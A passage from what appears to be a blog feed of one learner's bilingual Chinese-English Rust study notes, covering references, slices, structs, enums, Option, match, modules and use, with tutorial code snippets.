<p> We also cannot have a mutable reference while we have an immutable one.<br><code>可变变量有不变引用后，不能创建可变引用</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let r1 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    let r2 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    println!(<span class="string">&quot;&#123;&#125; and &#123;&#125;&quot;</span>, r1, r2);</span><br><span class="line">    /<span class="regexp">/ r1 and r2 are no longer used after this point</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r3 = &amp;mut s; /</span><span class="regexp">/ no problem</span></span><br><span class="line"><span class="regexp">    println!(&quot;&#123;&#125;&quot;, r3);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure>
<p><strong>引用范围从创建到最后一次使用<br>关键是不重叠</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let reference_to_nothing = dangle();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn dangle() -&gt; &amp;String &#123; <span class="regexp">//</span> dangle returns a reference to a String</span><br><span class="line"></span><br><span class="line">    let s = String::from(<span class="string">&quot;hello&quot;</span>); <span class="regexp">//</span> s is a new String</span><br><span class="line"></span><br><span class="line">    &amp;s /<span class="regexp">/ we return a reference to the String, s</span></span><br><span class="line"><span class="regexp">&#125; /</span><span class="regexp">/ Here, s goes out of scope, and is dropped. Its memory goes away.</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ Danger!</span></span><br></pre></td></tr></table></figure>

<h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; usize &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>iter </code>is a method that returns each element in a collection<br><code>enumerate</code> wraps the result of iter and returns each element as part of a tuple instead.<br><code>第一个参数是索引值，第二个是值的引用</code></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let hello = &amp;s[<span class="number">0</span>..<span class="number">5</span>]; <span class="regexp">//</span><span class="number">0</span>可以省去</span><br><span class="line">    let world = &amp;s[<span class="number">6</span>..<span class="number">11</span>]; 存<span class="number">6</span>-<span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="string-slices"><a href="#string-slices" class="headerlink" title="string slices"></a>string slices</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let s = String::from(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">let len = s.len();</span><br><span class="line"></span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..len];</span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..]; <span class="regexp">//</span>相同</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The type that signifies “string slice” is written as &amp;str:</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; &amp;str &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;s[<span class="number">0</span>..i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;s[..]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>String Literals Are Slices<br>固定字符串就是一种切片<br>The type of s here is &amp;str<br>it’s a slice pointing to that specific point of the binary</p>
<p>fn first_word(s: &amp;str) -&gt; &amp;str {<br><code>可以接受&amp;String 和 &amp;str</code> //String 和 字符串 如“hello”</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">let slice = &amp;a[<span class="number">1</span>..<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>结构体字段里都是可变的</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>顺序随便</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123; <span class="regexp">//</span>返回struct 实例</span><br><span class="line">    User &#123;</span><br><span class="line">        <span class="symbol">email:</span> email,</span><br><span class="line">        <span class="symbol">username:</span> username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = build_user(</span><br><span class="line">        String::from(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        String::from(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,  <span class="regexp">//</span>省略rather than <span class="symbol">email:</span> email.</span><br><span class="line">        username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>更新赋予另一实例</strong></p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let user2 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">&quot;another@example.com&quot;</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">&quot;anotherusername567&quot;</span>),</span><br><span class="line">        ..user1  /<span class="regexp">/ .. specifies that the remaining fields not explicitly set should have the same value as the fields in the given instance.</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br></pre></td></tr></table></figure>
<h3 id="tuple-struct"><a href="#tuple-struct" class="headerlink" title="tuple struct"></a>tuple struct</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    struct Color(i32, i32, i32);</span><br><span class="line">    struct Point(i32, i32, i32);</span><br><span class="line"></span><br><span class="line">    let black = Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    let origin = Point(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>做网站<br>文件路径的一些通用规则：</p>
<p>若引用的目标文件与 HTML 文件同级，只需直接使用文件名，比如 <code>my-image.jpg </code>。<br>要引用子文件夹中的文件，要在路径前写下目录名并加一个斜杠，比如 <code>subdirectory/my-image.jpg </code>。<br>若引用的目标文件位于 HTML 文件的上级，需要加上两个点。比如，如果 index.html 在 test-site 下面的一个子目录而 my-image.png 在 test-site 目录，你可以在 index.html 里使用 <code>../my-image.png 引用 my-image.png </code>。<br>以上方法可以随意组合，比如 ../subdirectory/another-subdirectory/my-image.png。</p>
]]></content>
      <tags>
        <tag>RUST</tag>
      </tags>
  </entry>
  <entry>
    <title>RUST学习3</title>
    <url>/2020/08/03/RUST%E5%AD%A6%E4%B9%A03/</url>
    <content><![CDATA[<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>The <code>Debug trait </code>enables us to print our struct in a way that is useful for developers so we can see its value while we’re debugging our code.</p>
<a id="more"></a>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">[derive(Debug)]  //开启使用debug :?打印结构体</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let rect1 = Rectangle &#123;</span><br><span class="line">        width: <span class="number">30</span>,</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">&quot;rect1 is &#123;:?&#125;&quot;</span>, rect1);  //or&#123;:<span class="comment">#?&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="method"><a href="#method" class="headerlink" title="method"></a>method</h3><p>their first parameter is <code>always self, </code>which represents the instance of the struct the method is being called on.</p>
<p>impl (implementation)</p>
<p>Methods can<code> take ownership of self,</code> borrow<code>self immutably</code>as we’ve done here, or borrow self mutably, just as they can any other parameter.<br><code>&amp;mut self</code></p>
<h3 id="associated-function"><a href="#associated-function" class="headerlink" title="associated function"></a>associated function</h3><p>You’ve already used the String::from associated function.</p>
<p>Associated functions are often used for constructors that will <code>return a new instance of the struct.</code></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">[derive(Debug)]</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Rectangle &#123;</span><br><span class="line">    fn square(size: u32) -&gt; Rectangle &#123;  //没有self</span><br><span class="line">        Rectangle &#123;</span><br><span class="line">            width: size,</span><br><span class="line">            height: size,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let sq = Rectangle::square(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Each struct is allowed to have multiple impl blocks. </p>
<h3 id="Enum"><a href="#Enum" class="headerlink" title="Enum"></a>Enum</h3><p>枚举</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">enum IpAddrKind &#123;</span><br><span class="line">    V4,  //V4 V6就是所谓的变体</span><br><span class="line">    V6,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let four = IpAddrKind::V4;</span><br><span class="line">    let six = IpAddrKind::V6;</span><br><span class="line"></span><br><span class="line">    route(IpAddrKind::V4);</span><br><span class="line">    route(IpAddrKind::V6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn route(ip_kind: IpAddrKind) &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>枚举比struct更简明</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(String),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(String::from(<span class="string">&quot;127.0.0.1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">&quot;::1&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>枚举每个变体可以有不同的类型</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    enum IpAddr &#123;</span><br><span class="line">        V4(u8, u8, u8, u8),</span><br><span class="line">        V6(String),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let home = IpAddr::V4(<span class="number">127</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let loopback = IpAddr::V6(String::from(<span class="string">&quot;::1&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">[allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">struct Ipv4Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Ipv6Addr &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum IpAddr &#123;</span><br><span class="line">    V4(Ipv4Addr),</span><br><span class="line">    V6(Ipv6Addr),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Message &#123;</span><br><span class="line">    Quit,</span><br><span class="line">    Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">    Write(String),</span><br><span class="line">    ChangeColor(i32, i32, i32),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    enum Message &#123;</span><br><span class="line">        Quit,</span><br><span class="line">        Move &#123; x: i32, y: i32 &#125;,</span><br><span class="line">        Write(String),</span><br><span class="line">        ChangeColor(i32, i32, i32),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    impl Message &#123;</span><br><span class="line">        fn <span class="built_in">call</span>(&amp;self) &#123;</span><br><span class="line">            // method body would be defined here</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let m = Message::Write(String::from(<span class="string">&quot;hello&quot;</span>));</span><br><span class="line">    m.call();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="enum-option"><a href="#enum-option" class="headerlink" title="enum option"></a>enum option</h3><figure class="highlight r"><table><tr><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">enum Option&lt;<span class="built_in">T</span>&gt; &#123; //&lt;<span class="built_in">T</span>&gt; means the Some variant of the Option enum can hold one piece of data of <span class="built_in">any</span> type</span><br><span class="line">    Some(<span class="built_in">T</span>),</span><br><span class="line">    None,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>option不用显示引入，已经提前有了</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_number = Some(<span class="number">5</span>);</span><br><span class="line">    let some_string = Some(<span class="string">&quot;a string&quot;</span>);</span><br><span class="line"></span><br><span class="line">    let absent_number: Option&lt;i32&gt; = None;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we use None rather than Some, we need to tell Rust what<code> type of Option&lt;T&gt;</code> we have<br>Option<T> and T (where T can be any type) are different types,<br>In other words, you have to convert an Option<T> to a <code>T</code> before you can perform T operations with it. </p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">match</span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>The code associated with <code>each arm is an expression</code>, and the resulting value of the expression in the matching arm is the value that gets returned for the entire match expression.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; &#123;</span><br><span class="line">            println!(<span class="string">&quot;Lucky penny!&quot;</span>);</span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter =&gt; <span class="number">25</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[derive(Debug)]</span><br><span class="line">enum UsState &#123;</span><br><span class="line">    Alabama,</span><br><span class="line">    Alaska,</span><br><span class="line">    // --snip--</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">enum Coin &#123;</span><br><span class="line">    Penny,</span><br><span class="line">    Nickel,</span><br><span class="line">    Dime,</span><br><span class="line">    Quarter(UsState),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn value_in_cents(coin: Coin) -&gt; u8 &#123;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Penny =&gt; <span class="number">1</span>,</span><br><span class="line">        Coin::Nickel =&gt; <span class="number">5</span>,</span><br><span class="line">        Coin::Dime =&gt; <span class="number">10</span>,</span><br><span class="line">        Coin::Quarter(state) =&gt; &#123;</span><br><span class="line">            println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state); //得到coin里quarter里的usstate值</span><br><span class="line">            <span class="number">25</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    value_in_cents(Coin::Quarter(UsState::Alaska));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用option<T></p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    fn plus_one(x: Option&lt;i32&gt;) -&gt; Option&lt;i32&gt; &#123;</span><br><span class="line">        match x &#123;</span><br><span class="line">            None =&gt; None,</span><br><span class="line">            Some(i) =&gt; Some(i + <span class="number">1</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let five = Some(<span class="number">5</span>);</span><br><span class="line">    let six = plus_one(five);</span><br><span class="line">    let none = plus_one(None);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>Combining match and enums</code> is useful in many situations.<br>match against an enum, <code>bind a variable to the data inside,</code> and then execute code based on it.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = <span class="number">0</span>u8;</span><br><span class="line">    match some_u8_value &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; println!(<span class="string">&quot;one&quot;</span>),</span><br><span class="line">        <span class="number">3</span> =&gt; println!(<span class="string">&quot;three&quot;</span>),</span><br><span class="line">        <span class="number">5</span> =&gt; println!(<span class="string">&quot;five&quot;</span>),</span><br><span class="line">        <span class="number">7</span> =&gt; println!(<span class="string">&quot;seven&quot;</span>),</span><br><span class="line">        _ =&gt; (),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>_</code>省略The _ pattern will match any value.<code>The () is just the unit value</code></p>
<h3 id="if-let"><a href="#if-let" class="headerlink" title="if let"></a>if let</h3><p>care about only one of the cases. For this situation, Rust provides if let.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let some_u8_value = Some(<span class="number">0</span>u8);</span><br><span class="line">    <span class="keyword">if</span> let Some(<span class="number">3</span>) = some_u8_value &#123;</span><br><span class="line">        println!(<span class="string">&quot;three&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> let Coin::Quarter(state) = coin &#123;</span><br><span class="line">        println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight r"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let coin = Coin::Penny;</span><br><span class="line">    let mut count = <span class="number">0</span>;</span><br><span class="line">    match coin &#123;</span><br><span class="line">        Coin::Quarter(state) =&gt; println!(<span class="string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state),</span><br><span class="line">        _ =&gt; count += <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="packages-gt-crates-gt-modules"><a href="#packages-gt-crates-gt-modules" class="headerlink" title="packages&gt;crates&gt;modules"></a>packages&gt;crates&gt;modules</h3><p> A package is<code>one or more crates</code>that provide a set of functionality. A package contains a Cargo.toml file that describes how to build those crates.<br>A package must contain zero or one library crates, and no more. It can contain as many binary crates as you’d like, but it must <code>contain at least one crate</code> (either library or binary).<br>If a package <code>contains src/main.rs and src/lib.rs, it has two crates: a library and a binary,</code> both with the same name as the package.<br>A package can<code>have multiple binary crates by placing files in the src/bin directory:</code>each file will be a separate binary crate.</p>
<p>the <code>use</code> keyword that brings a path into scope; and the <code>pub</code> keyword to make items public. We’ll also discuss the as keyword, external packages, and the glob operator</p>
<p>Modules let us organize code within a crate into groups</p>
<p>Create a new library named restaurant by running <code>cargo new --lib </code>restaurant;<br>crate //implicit module  src/main.rs and src/lib.rs 产生<br> └── front_of_house<br>     ├── hosting<br>     │   ├── add_to_waitlist<br>     │   └── seat_at_table<br>     └── serving<br>         ├── take_order<br>         ├── serve_order<br>         └── take_payment</p>
<p> If we want to call a function, we need to know its path.<br>A path can take two forms:</p>
<p>An <code>absolute path</code> starts from a crate root by using a crate name or a literal crate.<br>A <code>relative path </code>starts from the current module and uses self, super, or an identifier in the current module.<br>Both absolute and relative paths are followed by one or more identifiers separated by double colons (<code>::</code>).</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    mod hosting &#123;</span><br><span class="line">        fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The way privacy works in Rust is that all items (<code>functions, methods, structs, enums, modules, and constants) are private by default</code>.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125; //making the module public doesn’t make its contents public. </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    // Absolute path</span><br><span class="line">    crate::front_of_house::hosting::add_to_waitlist();</span><br><span class="line"></span><br><span class="line">    // Relative path</span><br><span class="line">    front_of_house::hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn serve_order() &#123;&#125;</span><br><span class="line"></span><br><span class="line">mod back_of_house &#123;</span><br><span class="line">    fn fix_incorrect_order() &#123;</span><br><span class="line">        cook_order();</span><br><span class="line">        super::serve_order();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fn cook_order() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> Enums aren’t very useful unless their variants are public; it would be annoying to have to annotate all enum variants with pub in every case, so the <code>default for enum variants is to be public. </code>Structs are often useful without their fields being public, so struct fields follow the general rule of <code>everything being private by default</code> unless annotated with pub.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">use</span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use crate::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mod front_of_house &#123;</span><br><span class="line">    pub mod hosting &#123;</span><br><span class="line">        pub fn add_to_waitlist() &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use self::front_of_house::hosting;</span><br><span class="line"></span><br><span class="line">pub fn eat_at_restaurant() &#123;</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">    hosting::add_to_waitlist();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="as"><a href="#as" class="headerlink" title="as"></a>as</h3><p>There’s another solution to the problem of bringing two types of the same name into the same scope with use: after the path, we can specify <code>as and a new local name</code>, or alias, for the type.</p>
<figure class="highlight r"><table><tr><td class="code"><pre><span class="line">![allow(unused_variables)]</span><br><span class="line">fn main() &#123;</span><br><span class="line">use std::fmt::Result;</span><br><span class="line">use std::io::Result as IoResult;</span><br><span class="line"></span><br><span class="line">fn function1() -&gt; Result &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn function2() -&gt; IoResult&lt;()&gt; &#123;</span><br><span class="line">    // --snip--</span><br><span class="line">    Ok(())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>this technique is called re-exporting because we’re bringing an item into scope but also making that item available for others to bring into their scope</p>
